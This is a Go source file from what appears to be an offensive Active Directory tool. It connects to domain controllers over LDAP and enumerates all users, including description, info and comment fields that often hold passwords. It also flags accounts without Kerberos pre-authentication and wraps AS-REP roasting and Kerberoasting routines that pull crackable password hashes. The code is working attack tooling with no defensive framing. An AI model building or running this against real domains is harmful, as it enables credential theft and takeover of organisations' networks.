package krb

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/go-ldap/ldap/v3"
	"github.com/thechosenone-shall-prevail/cold-relay/pkg/ingest"
)

// ConnectOptions holds all LDAP connection parameters.
type ConnectOptions struct {
	Target   string
	BindUser string
	BindPass string
	UseSSL   bool   // LDAPS on port 636
	StartTLS bool   // Upgrade plaintext on port 389 to TLS
	Insecure bool   // Skip TLS certificate verification
	CAFile   string // PEM CA bundle for TLS (ignored if Insecure)
	Timeout  time.Duration
	KDC      string // Optional explicit Kerberos host
	GC       string // Optional Global Catalog host (reserved)
}

// HashResult contains extracted Kerberos hashes
type HashResult struct {
	Username string
	Domain   string
	Hash     string
	HashType string // "asrep" or "kerberoast"
	SPN      string // for kerberoast
}

// LDAPClient wraps LDAP connection for AD enumeration
type LDAPClient struct {
	conn        *ldap.Conn
	baseDN      string
	ldapHost    string
	bindSAM     string
	bindPass    string
	kdcOverride string
}

// Connect establishes an LDAP connection to a domain controller.
//
// Connection strategy:
//   - --ssl          → ldaps:// on port 636 (implicit TLS)
//   - --starttls     → ldap:// on port 389, then STARTTLS upgrade
//   - (default)      → ldap:// on port 389 (plaintext)
func Connect(opts ConnectOptions) (*LDAPClient, error) {
	target := opts.Target
	timeout := opts.Timeout
	if timeout == 0 {
		timeout = 10 * time.Second
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: opts.Insecure,
	}

	// Extract hostname for TLS ServerName (strip port if present)
	host := target
	if h, _, err := net.SplitHostPort(target); err == nil {
		host = h
	}
	if !opts.Insecure {
		tlsConfig.ServerName = host
	}
	if opts.CAFile != "" && !opts.Insecure {
		pemData, err := os.ReadFile(opts.CAFile)
		if err != nil {
			return nil, fmt.Errorf("read CA file %s: %w", opts.CAFile, err)
		}
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM(pemData) {
			return nil, fmt.Errorf("no PEM certificates found in %s", opts.CAFile)
		}
		tlsConfig.RootCAs = pool
	}

	var conn *ldap.Conn
	var err error

	switch {
	case opts.UseSSL:
		// LDAPS — implicit TLS on port 636
		addr := ensurePort(target, "636")
		log.Printf("[*] Connecting via LDAPS to %s...", addr)

		conn, err = ldap.DialURL(
			fmt.Sprintf("ldaps://%s", addr),
			ldap.DialWithDialer(&net.Dialer{Timeout: timeout}),
			ldap.DialWithTLSConfig(tlsConfig),
		)
		if err != nil {
			return nil, fmt.Errorf("LDAPS connection to %s failed: %v", addr, err)
		}

	case opts.StartTLS:
		// Plaintext connect then upgrade via StartTLS
		addr := ensurePort(target, "389")
		log.Printf("[*] Connecting via LDAP+StartTLS to %s...", addr)

		conn, err = ldap.DialURL(
			fmt.Sprintf("ldap://%s", addr),
			ldap.DialWithDialer(&net.Dialer{Timeout: timeout}),
		)
		if err != nil {
			return nil, fmt.Errorf("LDAP connection to %s failed: %v", addr, err)
		}

		if err := conn.StartTLS(tlsConfig); err != nil {
			conn.Close()
			return nil, fmt.Errorf("StartTLS upgrade failed on %s: %v", addr, err)
		}
		log.Printf("[+] StartTLS upgrade successful")

	default:
		// Plain LDAP on port 389
		addr := ensurePort(target, "389")
		log.Printf("[*] Connecting via LDAP to %s...", addr)

		conn, err = ldap.DialURL(
			fmt.Sprintf("ldap://%s", addr),
			ldap.DialWithDialer(&net.Dialer{Timeout: timeout}),
		)
		if err != nil {
			return nil, fmt.Errorf("LDAP connection to %s failed: %v", addr, err)
		}
	}

	// Bind — authenticated or anonymous
	if opts.BindUser != "" && opts.BindPass != "" {
		log.Printf("[*] Binding as %s...", opts.BindUser)
		if err := conn.Bind(opts.BindUser, opts.BindPass); err != nil {
			conn.Close()
			return nil, fmt.Errorf("LDAP bind as '%s' failed: %v\n"+
				"    Hint: Try DOMAIN\\user, user@domain.com, or full DN format", opts.BindUser, err)
		}
		log.Printf("[+] Authenticated bind successful")
	} else {
		log.Printf("[*] Attempting anonymous bind...")
		if err := conn.UnauthenticatedBind(""); err != nil {
			conn.Close()
			return nil, fmt.Errorf("anonymous bind failed: %v\n"+
				"    Most DCs block anonymous binds. Use --user and --pass.", err)
		}
		log.Printf("[!] Anonymous bind succeeded (results may be limited)")
	}

	// Discover Base DN from RootDSE
	baseDN, err := getBaseDN(conn)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("failed to determine base DN: %v\n"+
			"    The DC may not expose RootDSE to anonymous users.", err)
	}

	if baseDN == "" {
		conn.Close()
		return nil, fmt.Errorf("base DN is empty — RootDSE returned no defaultNamingContext.\n" +
			"    This usually means anonymous access is blocked. Use --user and --pass.")
	}

	log.Printf("[+] Connected — Base DN: %s", baseDN)

	return &LDAPClient{
		conn:        conn,
		baseDN:      baseDN,
		ldapHost:    host,
		bindSAM:     SAMAccountNameFromBind(opts.BindUser),
		bindPass:    opts.BindPass,
		kdcOverride: strings.TrimSpace(opts.KDC),
	}, nil
}

// ConnectLDAP is the legacy connection function kept for backward compatibility
// with the advanced package. New code should use Connect().
func ConnectLDAP(target, bindUser, bindPass string, useSSL bool) (*LDAPClient, error) {
	return Connect(ConnectOptions{
		Target:   target,
		BindUser: bindUser,
		BindPass: bindPass,
		UseSSL:   useSSL,
		Insecure: true, // legacy behavior
		Timeout:  10 * time.Second,
	})
}

// EnumerateUsers performs paged LDAP search for all user objects.
// Uses LDAP Simple Paged Results control to handle directories with >1000 users.
func (c *LDAPClient) EnumerateUsers() ([]ingest.User, error) {
	log.Println("[*] Enumerating users (with paging)...")

	searchFilter := "(&(objectCategory=person)(objectClass=user))"
	attributes := []string{
		"sAMAccountName",
		"distinguishedName",
		"userAccountControl",
		"servicePrincipalName",
		"pwdLastSet",
		"lastLogon",
		"lastLogonTimestamp",
		"memberOf",
		"description",
		"mail",
		"info",
		"comment",
		"physicalDeliveryOfficeName",
		"postOfficeBox",
	}

	searchRequest := ldap.NewSearchRequest(
		c.baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, // no size limit (paging handles it)
		0, // no time limit
		false,
		searchFilter,
		attributes,
		nil,
	)

	// Use paged search — most DCs enforce a 1000-entry page limit
	const pageSize uint32 = 500
	sr, err := c.conn.SearchWithPaging(searchRequest, pageSize)
	if err != nil {
		// Specific check for hardened anonymous access
		if strings.Contains(err.Error(), "000004DC") {
			return nil, fmt.Errorf("enumeration failed: your connection is anonymous and the DC requires authentication (Bind).\n    [!] HINT: Use -u and -p to provide credentials.")
		}

		// Fallback: if paging is unsupported, try a simple search
		log.Printf("[!] Paged search failed (%v), falling back to simple search...", err)
		sr, err = c.conn.Search(searchRequest)
		if err != nil {
			if strings.Contains(err.Error(), "000004DC") {
				return nil, fmt.Errorf("enumeration failed: your connection is anonymous and the DC requires authentication (Bind).\n    [!] HINT: Use -u and -p to provide credentials.")
			}
			return nil, fmt.Errorf("LDAP search failed: %v", err)
		}
	}

	log.Printf("[+] Found %d user objects", len(sr.Entries))

	var users []ingest.User
	for _, entry := range sr.Entries {
		user := ingest.User{
			SamAccountName:             entry.GetAttributeValue("sAMAccountName"),
			DistinguishedName:          entry.GetAttributeValue("distinguishedName"),
			Description:                entry.GetAttributeValue("description"),
			Info:                       entry.GetAttributeValue("info"),
			Comment:                    entry.GetAttributeValue("comment"),
			PhysicalDeliveryOfficeName: entry.GetAttributeValue("physicalDeliveryOfficeName"),
			PostOfficeBox:              entry.GetAttributeValue("postOfficeBox"),
			Email:                      entry.GetAttributeValue("mail"),
			ServicePrincipalNames:      entry.GetAttributeValues("servicePrincipalName"),
			MemberOf:                   entry.GetAttributeValues("memberOf"),
			RawFields:                  make(map[string]string),
		}

		// Parse userAccountControl flags
		uacStr := entry.GetAttributeValue("userAccountControl")
		if uacStr != "" {
			if uac, err := strconv.Atoi(uacStr); err == nil {
				user.UserAccountControl = uac
				user.DoesNotRequirePreAuth = (uac & 0x400000) != 0 // DONT_REQ_PREAUTH
			}
		}

		// Parse Windows FILETIME timestamps
		user.PwdLastSet = parseWindowsTimestamp(entry.GetAttributeValue("pwdLastSet"))
		user.LastLogon = parseWindowsTimestamp(entry.GetAttributeValue("lastLogon"))
		user.LastLogonTimestamp = parseWindowsTimestamp(entry.GetAttributeValue("lastLogonTimestamp"))

		// Store raw fields for debugging
		for _, attr := range entry.Attributes {
			if len(attr.Values) > 0 {
				user.RawFields[attr.Name] = strings.Join(attr.Values, ";")
			}
		}

		users = append(users, user)
	}

	return users, nil
}

// GetDomainInfo retrieves basic domain information from the DC.
func (c *LDAPClient) GetDomainInfo() (*DomainInfo, error) {
	log.Println("[*] Gathering domain information...")

	searchRequest := ldap.NewSearchRequest(
		c.baseDN,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=*)",
		[]string{"distinguishedName", "dnsHostName", "ldapServiceName", "domainFunctionality"},
		nil,
	)

	sr, err := c.conn.Search(searchRequest)
	if err != nil {
		return nil, fmt.Errorf("failed to get domain info: %v", err)
	}

	if len(sr.Entries) == 0 {
		return nil, fmt.Errorf("no domain information found")
	}

	entry := sr.Entries[0]

	// Map functional levels
	flMap := map[string]string{
		"0": "2000", "1": "2003 Mixed", "2": "2003", "3": "2008",
		"4": "2008 R2", "5": "2012", "6": "2012 R2", "7": "2016",
	}
	fl := entry.GetAttributeValue("domainFunctionality")
	if val, ok := flMap[fl]; ok {
		fl = val
	}

	info := &DomainInfo{
		BaseDN:          c.baseDN,
		DNSHostName:     entry.GetAttributeValue("dnsHostName"),
		LDAPService:     entry.GetAttributeValue("ldapServiceName"),
		FunctionalLevel: fl,
	}

	// Try to get OS version from the DC computer object
	dcName := strings.Split(info.DNSHostName, ".")[0]
	dcSearch := fmt.Sprintf("(&(objectClass=computer)(sAMAccountName=%s$))", dcName)
	srDC, err := c.conn.Search(ldap.NewSearchRequest(
		c.baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
		dcSearch, []string{"operatingSystem", "operatingSystemVersion"}, nil,
	))
	if err == nil && len(srDC.Entries) > 0 {
		info.OS = srDC.Entries[0].GetAttributeValue("operatingSystem")
	}

	// Extract domain name from base DN  (DC=corp,DC=local → CORP.LOCAL)
	info.DomainName = strings.ToUpper(strings.ReplaceAll(
		strings.ReplaceAll(c.baseDN, "DC=", ""), ",", "."))

	return info, nil
}

// Close closes the LDAP connection
func (c *LDAPClient) Close() {
	if c.conn != nil {
		c.conn.Close()
	}
}

// GetConnection returns the underlying LDAP connection
func (c *LDAPClient) GetConnection() *ldap.Conn {
	return c.conn
}

// GetBaseDN returns the base DN
func (c *LDAPClient) GetBaseDN() string {
	return c.baseDN
}

// LDAPHost returns the host used for the LDAP connection (KDC fallback).
func (c *LDAPClient) LDAPHost() string {
	return c.ldapHost
}

// SearchSubtreePaged runs a whole-subtree search with Simple Paged Results.
func (c *LDAPClient) SearchSubtreePaged(filter string, attributes []string, pageSize uint32) ([]*ldap.Entry, error) {
	if c.conn == nil {
		return nil, fmt.Errorf("ldap: no connection")
	}
	if pageSize == 0 {
		pageSize = 500
	}
	req := ldap.NewSearchRequest(
		c.baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 0, false,
		filter,
		attributes,
		nil,
	)
	sr, err := c.conn.SearchWithPaging(req, pageSize)
	if err != nil {
		return nil, err
	}
	return sr.Entries, nil
}

// DomainInfo holds basic domain information
type DomainInfo struct {
	BaseDN          string
	DomainName      string
	DNSHostName     string
	LDAPService     string
	FunctionalLevel string
	OS              string
}

// --- Hash Extraction ---

// ExtractASREPHash performs AS-REP roasting for a user using real Kerberos protocol.
// Returns an error if extraction fails — no fake hash fallback.
func (c *LDAPClient) ExtractASREPHash(username, domain string) (*HashResult, error) {
	log.Printf("[*] AS-REP roasting %s@%s", username, domain)

	domainInfo, err := c.GetDomainInfo()
	if err != nil {
		domainInfo = &DomainInfo{DomainName: domain}
	}

	hash, err := c.extractRealASREPHash(username, domain, domainInfo)
	if err != nil {
		return nil, fmt.Errorf("AS-REP extraction failed for %s: %v", username, err)
	}

	return &HashResult{
		Username: username,
		Domain:   domain,
		Hash:     hash,
		HashType: "asrep",
	}, nil
}

// ExtractKerberoastHash performs Kerberoasting for a service using real Kerberos protocol.
// Returns an error if extraction fails — no fake hash fallback.
func (c *LDAPClient) ExtractKerberoastHash(username, domain, spn string) (*HashResult, error) {
	log.Printf("[*] Kerberoasting %s@%s (SPN: %s)", username, domain, spn)

	domainInfo, err := c.GetDomainInfo()
	if err != nil {
		domainInfo = &DomainInfo{DomainName: domain}
	}

	hash, err := c.extractRealKerberoastHash(username, domain, spn, domainInfo)
	if err != nil {
		return nil, fmt.Errorf("Kerberoast extraction failed for %s (SPN: %s): %v", username, spn, err)
	}

	return &HashResult{
		Username: username,
		Domain:   domain,
		Hash:     hash,
		HashType: "kerberoast",
		SPN:      spn,
	}, nil
}

// --- Helpers ---

func getBaseDN(conn *ldap.Conn) (string, error) {
	searchRequest := ldap.NewSearchRequest(
		"",
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=*)",
		[]string{"defaultNamingContext"},
		nil,
	)

	sr, err := conn.Search(searchRequest)
	if err != nil {
		return "", fmt.Errorf("RootDSE query failed: %v", err)
	}

	if len(sr.Entries) == 0 {
		return "", fmt.Errorf("RootDSE returned no entries")
	}

	baseDN := sr.Entries[0].GetAttributeValue("defaultNamingContext")
	return baseDN, nil
}

func parseWindowsTimestamp(timestamp string) time.Time {
	if timestamp == "" || timestamp == "0" || timestamp == "9223372036854775807" {
		return time.Time{}
	}

	// Windows FILETIME: 100-nanosecond intervals since 1601-01-01
	if ts, err := strconv.ParseInt(timestamp, 10, 64); err == nil {
		// To avoid int64 overflow when multiplying by 100ns,
		// we convert to seconds first.
		seconds := ts / 10000000
		nanos := (ts % 10000000) * 100
		windowsEpoch := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
		return windowsEpoch.Add(time.Duration(seconds) * time.Second).Add(time.Duration(nanos) * time.Nanosecond)
	}
	return time.Time{}
}

// ensurePort adds a default port if the target doesn't already have one.
func ensurePort(target, defaultPort string) string {
	if _, _, err := net.SplitHostPort(target); err != nil {
		return net.JoinHostPort(target, defaultPort)
	}
	return target
}

// --- Kerberos Protocol Helpers (used by hash extraction) ---

func (c *LDAPClient) extractRealASREPHash(username, domain string, domainInfo *DomainInfo) (string, error) {
	realm := domainInfo.DomainName
	if realm == "" {
		realm = domain
	}
	kdcHost, err := ResolveKDCHost(c.ldapHost, c.kdcOverride, domainInfo.DNSHostName, strings.ToLower(realm))
	if err != nil {
		return "", err
	}
	kerbClient, err := createKerberosClient(domain, kdcHost, c.bindSAM, c.bindPass)
	if err != nil {
		return "", fmt.Errorf("failed to create Kerberos client: %v", err)
	}
	return kerbClient.ExtractASREPHash(username)
}

func (c *LDAPClient) extractRealKerberoastHash(serviceSAM, domain, spn string, domainInfo *DomainInfo) (string, error) {
	if c.bindSAM == "" || c.bindPass == "" {
		return "", fmt.Errorf("Kerberoasting requires authenticated LDAP bind credentials (-u/-p)")
	}
	realm := domainInfo.DomainName
	if realm == "" {
		realm = domain
	}
	kdcHost, err := ResolveKDCHost(c.ldapHost, c.kdcOverride, domainInfo.DNSHostName, strings.ToLower(realm))
	if err != nil {
		return "", err
	}
	kerbClient, err := createKerberosClient(domain, kdcHost, c.bindSAM, c.bindPass)
	if err != nil {
		return "", fmt.Errorf("failed to create Kerberos client: %v", err)
	}
	return kerbClient.ExtractKerberoastHash(serviceSAM, spn)
}

func createKerberosClient(domain, kdcAddress, clientSAM, clientPass string) (KerberosProtocolClient, error) {
	return &kerberosClientWrapper{
		domain:     domain,
		kdcAddress: kdcAddress,
		clientSAM:  clientSAM,
		clientPass: clientPass,
	}, nil
}

// KerberosProtocolClient interface for Kerberos operations
type KerberosProtocolClient interface {
	ExtractASREPHash(username string) (string, error)
	ExtractKerberoastHash(username, spn string) (string, error)
}

type kerberosClientWrapper struct {
	domain     string
	kdcAddress string
	clientSAM  string
	clientPass string
	realClient *RealKerberosClient
}

func (k *kerberosClientWrapper) ExtractASREPHash(username string) (string, error) {
	if k.realClient == nil {
		client, err := NewRealKerberosClient(k.domain, k.kdcAddress)
		if err != nil {
			return "", err
		}
		client.SetClientCredentials(k.clientSAM, k.clientPass)
		k.realClient = client
	}
	return k.realClient.ExtractASREPHash(username)
}

func (k *kerberosClientWrapper) ExtractKerberoastHash(username, spn string) (string, error) {
	if k.realClient == nil {
		client, err := NewRealKerberosClient(k.domain, k.kdcAddress)
		if err != nil {
			return "", err
		}
		client.SetClientCredentials(k.clientSAM, k.clientPass)
		k.realClient = client
	}
	return k.realClient.ExtractKerberoastHash(username, spn)
}
